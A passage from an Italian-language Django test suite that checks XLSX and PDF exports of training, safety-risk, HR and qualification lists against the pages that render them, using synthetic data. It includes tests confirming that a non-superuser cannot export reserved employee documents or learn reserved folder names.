            tipo="INTERNO", nome="Docente Interno Test", email="docente@example.invalid",
            telefono="000",
        )
        TrainingInstructor.objects.create(
            tipo="ESTERNO", nome="Provider Esterno Test", ragione_sociale="Formazione SRL",
            is_active=False,
        )

        cls.sess_2026 = TrainingSession.objects.create(
            corso=cls.corso_anti, codice_sessione="S-2026-01", stato="COMPLETATA",
            modalita="IN_SEDE", data_inizio="2026-03-10", data_fine="2026-03-10",
            sede="Aula A", docente=cls.docente_int,
        )
        cls.sess_2025 = TrainingSession.objects.create(
            corso=cls.corso_excel, codice_sessione="S-2025-09", stato="PIANIFICATA",
            modalita="REMOTO", data_inizio="2025-09-01", data_fine="2025-09-02",
            docente_nome="Docente Snapshot",
        )

        cls.fattore_chim = FattoreRischio.objects.create(
            codice="CHIM01", nome="Solventi", categoria=FattoreRischio.CAT_CHIMICO,
            periodicita_formazione_mesi=24, periodicita_sorveglianza_mesi=12,
            richiede_visita_medica=True, richiede_dpi=True,
        )
        FattoreRischio.objects.create(
            codice="FIS01", nome="Rumore", categoria=FattoreRischio.CAT_FISICO,
            is_active=False,
        )

        cat = CategoriaCorso.objects.create(codice="CAT01", nome="Rischio chimico")
        cat.fattori_rischio.add(cls.fattore_chim)
        CategoriaCorso.objects.create(codice="CAT02", nome="Generale", is_active=False)

        cls.mansione = Mansione.objects.create(nome="Verniciatore")
        EsposizioneRischio.objects.create(
            fattore=cls.fattore_chim, mansione=cls.mansione, note="Cabina"
        )

        cls.admin = User.objects.create_superuser("admin_form", "form@example.invalid", "x")

    def setUp(self):
        self.client.force_login(self.admin)

    def _request(self, path: str = "/anagrafica/formazione/corsi/"):
        request = RequestFactory().get(path)
        request.user = self.admin
        return request

    def _export_url(self, key: str, **params) -> str:
        url = reverse("anagrafica:export", args=[key])
        return url + "?" + "&".join(f"{k}={v}" for k, v in params.items())

    # -- endpoint -----------------------------------------------------------
    def test_every_formazione_key_is_registered(self):
        for key in self.FORMAZIONE_KEYS:
            self.assertIn(key, EXPORT_SPECS)

    def test_xlsx_export_ok_for_every_key(self):
        for key in self.FORMAZIONE_KEYS:
            with self.subTest(key=key):
                resp = self.client.get(self._export_url(key, format="xlsx"))
                self.assertEqual(resp.status_code, 200)
                self.assertEqual(resp["Content-Type"], XLSX_CT)
                self.assertIn(key, resp["Content-Disposition"])

    def test_pdf_export_ok_for_every_key(self):
        for key in self.FORMAZIONE_KEYS:
            with self.subTest(key=key):
                resp = self.client.get(self._export_url(key, format="pdf"))
                self.assertEqual(resp.status_code, 200)
                self.assertEqual(resp["Content-Type"], "application/pdf")
                self.assertTrue(resp.content.startswith(b"%PDF"))

    def test_audit_written_with_the_right_key(self):
        for key in self.FORMAZIONE_KEYS:
            with self.subTest(key=key):
                self.client.get(self._export_url(key, format="xlsx"))
                log = AuditLog.objects.filter(azione="export").latest("id")
                self.assertEqual(log.modulo, "anagrafica")
                self.assertEqual(log.dettaglio.get("lista"), key)

    def test_columns_are_filled_by_every_dataset(self):
        for key in self.FORMAZIONE_KEYS:
            with self.subTest(key=key):
                spec = EXPORT_SPECS[key]
                rows = spec.dataset(self._request(), "full")
                self.assertTrue(rows)
                accessors = {accessor for _label, accessor in spec.columns}
                for row in rows:
                    self.assertEqual(accessors - set(row), set())

    # -- scope filtered vs full ---------------------------------------------
    def test_piani_filtered_scope_reduces_rows(self):
        spec = EXPORT_SPECS["formazione_piani"]
        request = self._request("/anagrafica/formazione/piani/?stato=ATTIVO")
        self.assertEqual(len(spec.dataset(request, "full")), 2)
        filtered = spec.dataset(request, "filtered")
        self.assertEqual([r["codice"] for r in filtered], ["SIC"])
        self.assertEqual(filtered[0]["n_corsi"], 1)
        self.assertEqual(filtered[0]["provider"], "Sì")
        self.assertIn("Attivo", spec.filters_label(request))

    def test_corsi_filtered_scope_reduces_rows(self):
        spec = EXPORT_SPECS["formazione_corsi"]
        request = self._request("/anagrafica/formazione/corsi/?obbligatorio=1&q=antinc")
        self.assertEqual(len(spec.dataset(request, "full")), 2)
        filtered = spec.dataset(request, "filtered")
        self.assertEqual([r["codice"] for r in filtered], ["ANTINC"])
        self.assertEqual(filtered[0]["piano"], "Sicurezza")
        self.assertEqual(filtered[0]["validita"], 36)
        self.assertEqual(filtered[0]["obbligatorio"], "Sì")
        label = spec.filters_label(request)
        self.assertIn("Solo obbligatori", label)
        self.assertIn("antinc", label)

    def test_corsi_validita_zero_is_una_tantum_like_the_page(self):
        rows = EXPORT_SPECS["formazione_corsi"].dataset(self._request(), "full")
        by_code = {r["codice"]: r for r in rows}
        self.assertEqual(by_code["EXCEL"]["validita"], "una tantum")

    def test_istruttori_filtered_scope_reduces_rows(self):
        spec = EXPORT_SPECS["formazione_istruttori"]
        request = self._request("/anagrafica/formazione/istruttori/?tipo=INTERNO")
        self.assertEqual(len(spec.dataset(request, "full")), 2)
        filtered = spec.dataset(request, "filtered")
        self.assertEqual([r["nome"] for r in filtered], ["Docente Interno Test"])
        self.assertEqual(filtered[0]["tipo"], "Interno")
        self.assertIn("Interno", spec.filters_label(request))

    def test_sessioni_filtered_scope_reduces_rows(self):
        spec = EXPORT_SPECS["formazione_sessioni"]
        request = self._request("/anagrafica/formazione/sessioni/?anno=2026")
        self.assertEqual(len(spec.dataset(request, "full")), 2)
        filtered = spec.dataset(request, "filtered")
        self.assertEqual([r["codice"] for r in filtered], ["S-2026-01"])
        self.assertEqual(filtered[0]["corso"], "Antincendio base")
        self.assertEqual(filtered[0]["piano"], "Sicurezza")
        self.assertEqual(filtered[0]["inizio"], "10-03-2026")
        self.assertEqual(filtered[0]["docente"], "Docente Interno Test")
        self.assertIn("2026", spec.filters_label(request))

    def test_sessioni_docente_snapshot_wins_like_the_page(self):
        rows = EXPORT_SPECS["formazione_sessioni"].dataset(self._request(), "full")
        by_code = {r["codice"]: r for r in rows}
        self.assertEqual(by_code["S-2025-09"]["docente"], "Docente Snapshot")

    # -- cataloghi safety senza filtri ---------------------------------------
    def test_fattori_rischio_rows_mirror_the_page(self):
        rows = EXPORT_SPECS["fattori_rischio"].dataset(self._request(), "full")
        by_code = {r["codice"]: r for r in rows}
        chim = by_code["CHIM01"]
        self.assertEqual(chim["categoria"], "Chimico")
        self.assertEqual(chim["period_form"], 24)
        self.assertEqual(chim["req_med"], "Sì")
        self.assertEqual(chim["n_categorie"], 1)
        self.assertEqual(chim["n_esposizioni"], 1)
        self.assertEqual(by_code["FIS01"]["attivo"], "No")
        self.assertEqual(by_code["FIS01"]["period_form"], "")

    def test_categorie_corso_rows_list_linked_fattori(self):
        rows = EXPORT_SPECS["categorie_corso"].dataset(self._request(), "full")
        by_code = {r["codice"]: r for r in rows}
        self.assertEqual(by_code["CAT01"]["fattori"], "CHIM01")
        self.assertEqual(by_code["CAT02"]["fattori"], "")
        self.assertEqual(by_code["CAT02"]["attivo"], "No")

    def test_esposizioni_rows_mirror_the_page(self):
        rows = EXPORT_SPECS["esposizioni_rischio"].dataset(self._request(), "full")
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["fattore"], "[CHIM01] Solventi")
        self.assertEqual(rows[0]["categoria"], "Chimico")
        self.assertEqual(rows[0]["mansione"], "Verniciatore")
        self.assertEqual(rows[0]["area"], "")

    # -- anti-drift: export ↔ righe RENDERIZZATE dalla pagina -----------------
    def test_corsi_export_matches_rows_actually_rendered_by_the_page(self):
        for querystring in ("", "?q=antinc", "?obbligatorio=0", f"?piano={self.piano_sic.pk}"):
            with self.subTest(querystring=querystring):
                resp = self.client.get(
                    reverse("anagrafica:formazione_corsi_list") + querystring
                )
                self.assertEqual(resp.status_code, 200)
                page_codes = [c.codice for c in resp.context["page_obj"].object_list]

                export_rows = EXPORT_SPECS["formazione_corsi"].dataset(
                    self._request(f"/anagrafica/formazione/corsi/{querystring}"), "filtered"
                )
                self.assertEqual(page_codes, [r["codice"] for r in export_rows])

    def test_sessioni_export_matches_rows_actually_rendered_by_the_page(self):
        for querystring in ("", "?anno=2026", "?stato=PIANIFICATA", f"?corso={self.corso_anti.pk}"):
            with self.subTest(querystring=querystring):
                resp = self.client.get(
                    reverse("anagrafica:formazione_sessioni_list") + querystring
                )
                self.assertEqual(resp.status_code, 200)
                page_codes = [s.codice_sessione for s in resp.context["page_obj"].object_list]

                export_rows = EXPORT_SPECS["formazione_sessioni"].dataset(
                    self._request(f"/anagrafica/formazione/sessioni/{querystring}"), "filtered"
                )
                self.assertEqual(page_codes, [r["codice"] for r in export_rows])

    def test_view_context_is_unchanged_by_the_extraction(self):
        """Non-regressione: le tendine (aggregati pre-filtro) non seguono i filtri."""
        resp = self.client.get(
            reverse("anagrafica:formazione_sessioni_list") + "?anno=2026"
        )
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp.context["page_obj"].paginator.count, 1)   # filtrate
        self.assertEqual(sorted(resp.context["anni"]), [2025, 2026])    # pre-filtro
        self.assertEqual(len(resp.context["corsi_attivi"]), 2)          # pre-filtro
        self.assertEqual(resp.context["filtro_anno"], "2026")

        resp = self.client.get(reverse("anagrafica:formazione_corsi_list") + "?obbligatorio=1")
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp.context["page_obj"].paginator.count, 1)   # filtrati
        self.assertEqual(len(resp.context["piani"]), 2)                 # pre-filtro
        self.assertEqual(resp.context["filtro_obbligatorio"], "1")

    # -- UI: menu export nella toolbar ---------------------------------------
    def test_formazione_pages_show_the_export_menu(self):
        pages = {
            "formazione_piani": "anagrafica:formazione_piani_list",
            "formazione_corsi": "anagrafica:formazione_corsi_list",
            "formazione_istruttori": "anagrafica:formazione_istruttori_list",
            "formazione_sessioni": "anagrafica:formazione_sessioni_list",
            "fattori_rischio": "anagrafica:fattori_rischio_list",
            "categorie_corso": "anagrafica:categorie_corso_list",
            "esposizioni_rischio": "anagrafica:esposizioni_rischio_list",
        }
        for key, route in pages.items():
            with self.subTest(key=key):
                resp = self.client.get(reverse(route))
                self.assertEqual(resp.status_code, 200)
                html = resp.content.decode()
                base = reverse("anagrafica:export", args=[key])
                self.assertIn("Esporta", html)
                self.assertIn('href="#i-download"', html)
                self.assertIn(f'{base}?format=xlsx&amp;scope=filtered"', html)
                self.assertIn(f'{base}?format=pdf&amp;scope=full"', html)

    def test_corsi_page_propagates_querystring_on_filtered_links(self):
        resp = self.client.get(reverse("anagrafica:formazione_corsi_list") + "?q=antinc")
        self.assertEqual(resp.status_code, 200)
        html = resp.content.decode()
        base = reverse("anagrafica:export", args=["formazione_corsi"])
        self.assertIn(f'{base}?format=xlsx&amp;scope=filtered&amp;q=antinc"', html)
        self.assertIn(f'{base}?format=pdf&amp;scope=full"', html)


@override_settings(LEGACY_AUTH_ENABLED=False, SECURE_SSL_REDIRECT=False)
class HrExportTests(TestCase):
    """Export delle liste HR e documenti (Task 8) — dati personali dei dipendenti.

    Chiavi: `ex_dipendenti`, `documenti`, `onboarding`, `ratei`.
    Dati **sintetici** (nessun dato reale). Il test critico è lo scoping per
    riga dell'archivio documentale: le cartelle riservate (`solo_admin`) non
    devono finire nell'export di un utente HR non-superuser, nemmeno con
    `scope=full` (il gate ACL da solo non basta).
    """

    HR_KEYS = ("ex_dipendenti", "documenti", "onboarding", "ratei")

    def setUp(self):
        from anagrafica.models import (
            AnagraficaHRPermission,
            CartellaDocumentoDipendente,
            DipendenteAnagraficaCivile,
            DocumentoDipendente,
            OnboardingPratica,
            OnboardingTask,
            SaldoCedolino,
        )
        from anagrafica.tests import _ensure_anagrafica_table

        _ensure_anagrafica_table()
        with connection.cursor() as cursor:
            cursor.execute("DELETE FROM anagrafica_dipendenti")
            for alias, nome, cognome, matricola in (
                ("m.rossi", "Mario", "Rossi", "M001"),
                ("c.cessato", "Carlo", "Cessato", "M002"),
                ("d.uscito", "Dina", "Uscita", "M003"),
            ):
                cursor.execute(
                    """
                    INSERT INTO anagrafica_dipendenti
                        (aliasusername, nome, cognome, reparto, mansione, matricola, attivo)
                    VALUES (%s, %s, %s, %s, %s, %s, %s)
                    """,
                    [alias, nome, cognome, "Officina", "Saldatore", matricola, 1],
                )
            cursor.execute(
                "SELECT id FROM anagrafica_dipendenti WHERE aliasusername = %s", ["m.rossi"]
            )
            self.attivo_id = int(cursor.fetchone()[0])
            cursor.execute(
                "SELECT id FROM anagrafica_dipendenti WHERE aliasusername = %s", ["c.cessato"]
            )
            self.cessato_id = int(cursor.fetchone()[0])
            cursor.execute(
                "SELECT id FROM anagrafica_dipendenti WHERE aliasusername = %s", ["d.uscito"]
            )
            self.uscita_id = int(cursor.fetchone()[0])

        DipendenteAnagraficaAziendale.objects.create(
            legacy_anagrafica_id=self.cessato_id,
            data_cessazione="2024-06-30",
            data_assunzione_ultima="2019-03-01",
            tipologia_contratto="INDETERMINATO",
        )
        DipendenteAnagraficaAziendale.objects.create(
            legacy_anagrafica_id=self.uscita_id,
            data_cessazione="2025-11-15",
        )

        # Documenti: 1 in cartella normale, 1 in cartella RISERVATA, 1 senza cartella.
        self.cart_pub = CartellaDocumentoDipendente.objects.create(nome="Contratti")
        self.cart_ris = CartellaDocumentoDipendente.objects.create(
            nome="Provvedimenti", solo_admin=True
        )
        DocumentoDipendente.objects.create(
            legacy_anagrafica_id=self.attivo_id,
            tipo=DocumentoDipendente.Tipo.MANUALE,
            cartella=self.cart_pub,
            file="sintetico/contratto.pdf",
            nome_originale="contratto.pdf",
            descrizione="Contratto sintetico",
        )
        DocumentoDipendente.objects.create(
            legacy_anagrafica_id=self.attivo_id,
            tipo=DocumentoDipendente.Tipo.MANUALE,
            cartella=self.cart_ris,
            file="sintetico/riservato.pdf",
            nome_originale="riservato.pdf",
            descrizione="Documento riservato sintetico",
        )
        DocumentoDipendente.objects.create(
            legacy_anagrafica_id=self.attivo_id,
            tipo=DocumentoDipendente.Tipo.MANUALE,
            cartella=None,
            file="sintetico/libero.pdf",
            nome_originale="libero.pdf",
        )
        # Documento di sistema: mai nell'archivio manuale.
        DocumentoDipendente.objects.create(
            legacy_anagrafica_id=self.attivo_id,
            tipo=DocumentoDipendente.Tipo.DPI_CONSEGNA,
            file="sintetico/dpi.pdf",
            nome_originale="dpi.pdf",
        )

        # Onboarding: 1 in corso (con 1 task completato su 2), 1 chiusa.
        self.prat_corso = OnboardingPratica.objects.create(
            legacy_anagrafica_id=self.attivo_id,
            dipendente_nome="Rossi Mario",
            reparto="Officina",
            data_assunzione="2026-01-07",
            stato=OnboardingPratica.STATO_IN_CORSO,
        )
        OnboardingTask.objects.create(
            pratica=self.prat_corso, codice="ACCOUNT", titolo="Account",
            stato=OnboardingTask.STATO_COMPLETATO,
        )
        OnboardingTask.objects.create(
            pratica=self.prat_corso, codice="BADGE", titolo="Badge",
            stato=OnboardingTask.STATO_DA_FARE,
        )
        OnboardingPratica.objects.create(
            legacy_anagrafica_id=self.uscita_id,
            dipendente_nome="Uscita Dina",
            stato=OnboardingPratica.STATO_CHIUSA,
        )

        # Ratei: 2 mensilità per lo stesso dipendente sintetico.
        DipendenteAnagraficaCivile.objects.create(
            legacy_anagrafica_id=self.attivo_id, codice_fiscale="RSSMRA80A01H501U"
        )
        SaldoCedolino.objects.create(
            tax_code="RSSMRA80A01H501U", legacy_anagrafica_id=self.attivo_id,
            data_competenza="2026-05-31", ferie_residui=40, rol_residui=8,
        )
        SaldoCedolino.objects.create(
            tax_code="RSSMRA80A01H501U", legacy_anagrafica_id=self.attivo_id,
            data_competenza="2026-04-30", ferie_residui=30,
        )

        # Permesso HR applicativo: aperto a tutti gli autenticati, così esiste un
        # utente HR NON superuser (il caso critico dello scoping `solo_admin`).
        perm = AnagraficaHRPermission.get_instance()
        perm.accesso = AnagraficaHRPermission.ACCESSO_TUTTI
        perm.save(update_fields=["accesso"])

        self.admin = User.objects.create_superuser("admin_hr", "hr@example.invalid", "x")
        self.hr_user = User.objects.create_user("hr_no_su", "hr2@example.invalid", "x")
        UserOnboarding.objects.create(user=self.hr_user, completed=True)
        self.client.force_login(self.admin)

    def _request(self, path: str = "/anagrafica/documenti/", user=None):
        request = RequestFactory().get(path)
        request.user = user or self.admin
        return request

    def _export_url(self, key: str, **params) -> str:
        url = reverse("anagrafica:export", args=[key])
        return url + "?" + "&".join(f"{k}={v}" for k, v in params.items())

    # -- endpoint -----------------------------------------------------------
    def test_every_hr_key_is_registered(self):
        for key in self.HR_KEYS:
            self.assertIn(key, EXPORT_SPECS)

    def test_xlsx_export_ok_for_every_key(self):
        for key in self.HR_KEYS:
            with self.subTest(key=key):
                resp = self.client.get(self._export_url(key, format="xlsx"))
                self.assertEqual(resp.status_code, 200)
                self.assertEqual(resp["Content-Type"], XLSX_CT)
                self.assertIn(key, resp["Content-Disposition"])

    def test_pdf_export_ok_for_every_key(self):
        for key in self.HR_KEYS:
            with self.subTest(key=key):
                resp = self.client.get(self._export_url(key, format="pdf"))
                self.assertEqual(resp.status_code, 200)
                self.assertEqual(resp["Content-Type"], "application/pdf")
                self.assertTrue(resp.content.startswith(b"%PDF"))

    def test_audit_written_with_the_right_key(self):
        for key in self.HR_KEYS:
            with self.subTest(key=key):
                self.client.get(self._export_url(key, format="xlsx"))
                log = AuditLog.objects.filter(azione="export").latest("id")
                self.assertEqual(log.modulo, "anagrafica")
                self.assertEqual(log.dettaglio.get("lista"), key)

    def test_documenti_and_ratei_denied_without_hr_permission(self):
        """Gate applicativo (`hr_gate`/`documenti_gate`): in dev/test l'ACL di
        rotta è neutro (`LEGACY_AUTH_ENABLED=False`), quindi il deny reale è
        `_check_hr_permission`. Un utente autenticato NON superuser, NON admin
        legacy, con permesso HR chiuso (`ACCESSO_ADMIN`, il default) deve
        prendere 403 — non basta essere loggati per scaricare documenti/ratei."""
        from anagrafica.models import AnagraficaHRPermission

        perm = AnagraficaHRPermission.get_instance()
        perm.accesso = AnagraficaHRPermission.ACCESSO_ADMIN
        perm.save(update_fields=["accesso"])

        self.client.force_login(self.hr_user)
        for key in ("documenti", "ratei"):
            with self.subTest(key=key):
                resp = self.client.get(self._export_url(key, format="xlsx"))
                self.assertEqual(resp.status_code, 403)

    def test_columns_are_filled_by_every_dataset(self):
        for key in self.HR_KEYS:
            with self.subTest(key=key):
                spec = EXPORT_SPECS[key]
                rows = spec.dataset(self._request(), "full")
                self.assertTrue(rows)
                accessors = {accessor for _label, accessor in spec.columns}
                for row in rows:
                    self.assertEqual(accessors - set(row), set())

    # -- ex dipendenti ------------------------------------------------------
    def test_ex_dipendenti_only_cessati_and_columns_mirror_the_page(self):
        spec = EXPORT_SPECS["ex_dipendenti"]
        rows = spec.dataset(self._request("/anagrafica/ex-dipendenti/"), "full")
        self.assertEqual({r["username"] for r in rows}, {"c.cessato", "d.uscito"})
        cessato = next(r for r in rows if r["username"] == "c.cessato")
        self.assertEqual(cessato["matricola"], "M002")
        self.assertEqual(cessato["contratto"], "Tempo indeterminato")
        self.assertEqual(cessato["data_assunzione"], "01-03-2019")
        self.assertEqual(cessato["data_cessazione"], "30-06-2024")
        self.assertEqual(
            [accessor for _label, accessor in spec.columns],
            ["cognome", "nome", "username", "matricola", "contratto",
             "data_assunzione", "data_cessazione"],
        )

    def test_ex_dipendenti_filtered_scope_reduces_rows(self):
        spec = EXPORT_SPECS["ex_dipendenti"]
        request = self._request("/anagrafica/ex-dipendenti/?q=cessato")
        self.assertEqual(len(spec.dataset(request, "full")), 2)
        filtered = spec.dataset(request, "filtered")
        self.assertEqual([r["username"] for r in filtered], ["c.cessato"])
        self.assertIn("cessato", spec.filters_label(request))

    def test_ex_dipendenti_export_matches_rows_actually_rendered_by_the_page(self):
        for querystring in ("", "?q=cessato", "?q=usc"):
            with self.subTest(querystring=querystring):
                resp = self.client.get(
                    reverse("anagrafica:ex_dipendenti_list") + querystring
                )
                self.assertEqual(resp.status_code, 200)
                page_users = [
                    str(row.get("aliasusername") or "")
                    for row in resp.context["page_obj"].object_list
                ]
                export_rows = EXPORT_SPECS["ex_dipendenti"].dataset(
                    self._request(f"/anagrafica/ex-dipendenti/{querystring}"), "filtered"
                )
                self.assertEqual(page_users, [r["username"] for r in export_rows])

    def test_ex_dipendenti_view_context_is_unchanged_by_the_extraction(self):
        resp = self.client.get(reverse("anagrafica:ex_dipendenti_list") + "?q=cessato")
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp.context["n_ex"], 2)                       # pre-filtro
        self.assertEqual(resp.context["page_obj"].paginator.count, 1)   # filtrati
        self.assertEqual(resp.context["q"], "cessato")

    # -- documenti: scoping per riga (solo_admin) ----------------------------
    def test_documenti_solo_admin_rows_are_excluded_for_non_superuser(self):
        """SICUREZZA: l'utente HR non-superuser non esporta i documenti riservati,
        nemmeno con `scope=full` (dove i filtri di pagina non si applicano)."""
        spec = EXPORT_SPECS["documenti"]
        for scope in ("filtered", "full"):
            with self.subTest(scope=scope):
                rows = spec.dataset(
                    self._request("/anagrafica/documenti/", user=self.hr_user), scope
                )
                files = [r["file"] for r in rows]
                self.assertNotIn("riservato.pdf", files)
                self.assertIn("contratto.pdf", files)
                self.assertIn("libero.pdf", files)

    def test_documenti_solo_admin_rows_are_included_for_superuser(self):
        spec = EXPORT_SPECS["documenti"]
        rows = spec.dataset(self._request("/anagrafica/documenti/"), "full")
        files = [r["file"] for r in rows]
        self.assertIn("riservato.pdf", files)
        self.assertEqual(len(files), 3)  # i documenti di sistema (DPI) restano fuori

    def test_documenti_solo_admin_rows_excluded_end_to_end_for_non_superuser(self):
        """Stesso invariante ma via endpoint reale: il gate passa (utente HR) e
        deve essere il dataset a togliere le righe riservate."""
        self.client.force_login(self.hr_user)
        resp = self.client.get(self._export_url("documenti", format="xlsx", scope="full"))
        self.assertEqual(resp.status_code, 200)
        log = AuditLog.objects.filter(azione="export").latest("id")
        self.assertEqual(log.dettaglio.get("n_righe"), 2)  # 3 - 1 riservato

        self.client.force_login(self.admin)
        resp = self.client.get(self._export_url("documenti", format="xlsx", scope="full"))
        self.assertEqual(resp.status_code, 200)
        log = AuditLog.objects.filter(azione="export").latest("id")
        self.assertEqual(log.dettaglio.get("n_righe"), 3)

    def test_documenti_reserved_cartella_name_not_disclosed_via_filter_label(self):
        """SICUREZZA: un utente HR non-superuser che filtra per l'id di una
        cartella riservata (`solo_admin`) ottiene già 0 righe, ma non deve
        ricevere il NOME della cartella nell'etichetta filtro — né
        nell'intestazione del PDF/XLSX né nella riga di audit. Il nome non
        compare nemmeno nella tendina della pagina (`views.documenti_list`
        esclude le cartelle solo_admin dal contesto): l'export non deve
        poterlo enumerare passando l'id a mano."""
        spec = EXPORT_SPECS["documenti"]
        request = self._request(
            f"/anagrafica/documenti/?cartella={self.cart_ris.pk}", user=self.hr_user
        )
        rows = spec.dataset(request, "filtered")
        self.assertEqual(rows, [])
        label = spec.filters_label(request)
        self.assertNotIn(self.cart_ris.nome, label)
        self.assertNotIn("Provvedimenti", label)

        # Stesso invariante via endpoint reale: il nome non deve comparire
        # nella riga di audit (`filtri`).
        self.client.force_login(self.hr_user)
        resp = self.client.get(
            self._export_url("documenti", format="xlsx", cartella=self.cart_ris.pk)
        )
        self.assertEqual(resp.status_code, 200)
        log = AuditLog.objects.filter(azione="export").latest("id")
        self.assertNotIn(self.cart_ris.nome, log.dettaglio.get("filtri", ""))

        # Controllo positivo (niente falso positivo nel test): il superuser
        # continua a vedere il nome della cartella riservata.
        su_request = self._request(f"/anagrafica/documenti/?cartella={self.cart_ris.pk}")
        self.assertIn(self.cart_ris.nome, spec.filters_label(su_request))

    def test_documenti_filtered_scope_reduces_rows(self):
        spec = EXPORT_SPECS["documenti"]
        request = self._request(f"/anagrafica/documenti/?cartella={self.cart_pub.pk}")
        self.assertEqual(len(spec.dataset(request, "full")), 3)
        filtered = spec.dataset(request, "filtered")
        self.assertEqual([r["file"] for r in filtered], ["contratto.pdf"])
        self.assertEqual(filtered[0]["cartella"], "Contratti")
        self.assertEqual(filtered[0]["dipendente"], "Rossi Mario")
        self.assertIn("Contratti", spec.filters_label(request))

    def test_documenti_search_filter_matches_the_page(self):
        spec = EXPORT_SPECS["documenti"]
        request = self._request("/anagrafica/documenti/?q=libero")
        filtered = spec.dataset(request, "filtered")
        self.assertEqual([r["file"] for r in filtered], ["libero.pdf"])
        self.assertEqual(filtered[0]["cartella"], "Senza cartella")

    # -- onboarding ---------------------------------------------------------
    def test_onboarding_rows_mirror_the_page(self):
        rows = EXPORT_SPECS["onboarding"].dataset(self._request("/anagrafica/onboarding/"), "full")
        by_name = {r["dipendente"]: r for r in rows}
        self.assertEqual(by_name["Rossi Mario"]["stato"], "In corso")
        self.assertEqual(by_name["Rossi Mario"]["reparto"], "Officina")
        self.assertEqual(by_name["Rossi Mario"]["data_assunzione"], "07-01-2026")
        self.assertEqual(by_name["Rossi Mario"]["avanzamento"], "1/2 completati")
        self.assertEqual(by_name["Uscita Dina"]["stato"], "Chiusa")

    def test_onboarding_filtered_scope_reduces_rows(self):
        spec = EXPORT_SPECS["onboarding"]
        request = self._request("/anagrafica/onboarding/?stato=CHIUSA")
        self.assertEqual(len(spec.dataset(request, "full")), 2)
        filtered = spec.dataset(request, "filtered")
        self.assertEqual([r["dipendente"] for r in filtered], ["Uscita Dina"])
        self.assertIn("Chiusa", spec.filters_label(request))

    # -- ratei --------------------------------------------------------------
    def test_ratei_rows_mirror_the_page(self):
        rows = EXPORT_SPECS["ratei"].dataset(self._request("/anagrafica/ratei/"), "full")
        self.assertEqual(len(rows), 2)
        self.assertEqual({r["dipendente"] for r in rows}, {"Rossi Mario"})
        self.assertEqual(rows[0]["ferie_residui"], 40.0)  # ordine: mensilità più recente

    def test_ratei_filtered_scope_reduces_rows(self):
        spec = EXPORT_SPECS["ratei"]
        request = self._request("/anagrafica/ratei/?periodo=2026-04-30")
        self.assertEqual(len(spec.dataset(request, "full")), 2)
        filtered = spec.dataset(request, "filtered")
        self.assertEqual(len(filtered), 1)
        self.assertEqual(filtered[0]["ferie_residui"], 30.0)
        self.assertIn("2026-04-30", spec.filters_label(request))

    def test_ratei_dipendente_filter_reduces_rows(self):
        spec = EXPORT_SPECS["ratei"]
        request = self._request("/anagrafica/ratei/?dipendente=XXXNONESISTE00A00X000X")
        self.assertEqual(spec.dataset(request, "filtered"), [])
        self.assertEqual(len(spec.dataset(request, "full")), 2)

    def test_ratei_dedicated_export_still_works(self):
        """Non-regressione: l'export XLSX storico dei ratei resta intatto."""
        resp = self.client.get(reverse("anagrafica:ratei_export"))
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp["Content-Type"], XLSX_CT)

    # -- UI: menu export nella toolbar ---------------------------------------
    def test_hr_pages_show_the_export_menu(self):
        pages = {
            "ex_dipendenti": "anagrafica:ex_dipendenti_list",
            "documenti": "anagrafica:documenti_list",
            "onboarding": "anagrafica:onboarding_list",
            "ratei": "anagrafica:ratei_list",
        }
        for key, route in pages.items():
            with self.subTest(key=key):
                resp = self.client.get(reverse(route))
                self.assertEqual(resp.status_code, 200)
                html = resp.content.decode()
                base = reverse("anagrafica:export", args=[key])
                self.assertIn("Esporta", html)
                self.assertIn('href="#i-download"', html)
                self.assertIn(f'{base}?format=xlsx&amp;scope=filtered"', html)
                self.assertIn(f'{base}?format=pdf&amp;scope=full"', html)

    def test_ex_dipendenti_page_propagates_querystring_on_filtered_links(self):
        resp = self.client.get(reverse("anagrafica:ex_dipendenti_list") + "?q=cessato")
        self.assertEqual(resp.status_code, 200)
        html = resp.content.decode()
        base = reverse("anagrafica:export", args=["ex_dipendenti"])
        self.assertIn(f'{base}?format=xlsx&amp;scope=filtered&amp;q=cessato"', html)
        self.assertIn(f'{base}?format=pdf&amp;scope=full"', html)


@override_settings(LEGACY_AUTH_ENABLED=False, SECURE_SSL_REDIRECT=False)
class MpqExportTests(TestCase):
    """Export delle liste MOD.128 / MPQ (Task 9).

    Chiavi: `mpq_vista` (vista MOD.128, gate `anagrafica.mpq.view`) e
    `mpq_clienti` (clienti/enti qualificanti, gate `anagrafica.mpq.manage`).
    Dati **sintetici** (nessun dato reale del MOD.128). Le altre rotte `mod128/`
    non sono elenchi: il cruscotto è una dashboard, il dettaglio processo e i
    form non sono liste tabellari → nessuna spec.
    """

    MPQ_KEYS = ("mpq_vista", "mpq_clienti")

    def setUp(self):
        from anagrafica.models_mpq import (
            AbilitazioneProcesso,
            CertificazioneIndividuale,
            ClienteQualificante,
            ProcessoQualificato,
            RiferimentoProcesso,
        )
        from anagrafica.tests import _ensure_anagrafica_table, _ensure_utenti_table

        _ensure_anagrafica_table()
        _ensure_utenti_table()

        self.organismo = ClienteQualificante.objects.create(
            nome="Organismo Beta", tipo=ClienteQualificante.TIPO_ORGANISMO_CERTIFICAZIONE,
        )
        self.cliente_a = ClienteQualificante.objects.create(
            nome="Cliente Alpha", tipo=ClienteQualificante.TIPO_CLIENTE, codice="ALPHA",
        )
        self.ente_gamma = ClienteQualificante.objects.create(
            nome="Ente Gamma", tipo=ClienteQualificante.TIPO_ENTE_ESTERNO,
            certificatore=self.organismo, is_active=False,
        )

        self.reparto = Reparto.objects.create(nome="Officina Test")

        self.proc_attivo = ProcessoQualificato.objects.create(
            nome="Trattamento termico", cliente=self.cliente_a,
            regime=ProcessoQualificato.REGIME_NADCAP, livello="LVL2",
            stato=ProcessoQualificato.STATO_ATTIVO,
            tipo_validita=ProcessoQualificato.VALIDITA_DATA,
            data_scadenza="2026-12-31",
        )
        self.proc_attivo.reparti.add(self.reparto)
        RiferimentoProcesso.objects.create(processo=self.proc_attivo, codice="APPR-001")

        self.proc_org = ProcessoQualificato.objects.create(
            nome="Controllo non distruttivo", cliente=self.cliente_a,
            regime=ProcessoQualificato.REGIME_PART145,
            stato=ProcessoQualificato.STATO_ATTIVO,
            tipo_validita=ProcessoQualificato.VALIDITA_ILLIMITATA,
            personale_modalita=ProcessoQualificato.MODALITA_ORGANIZZATIVO,
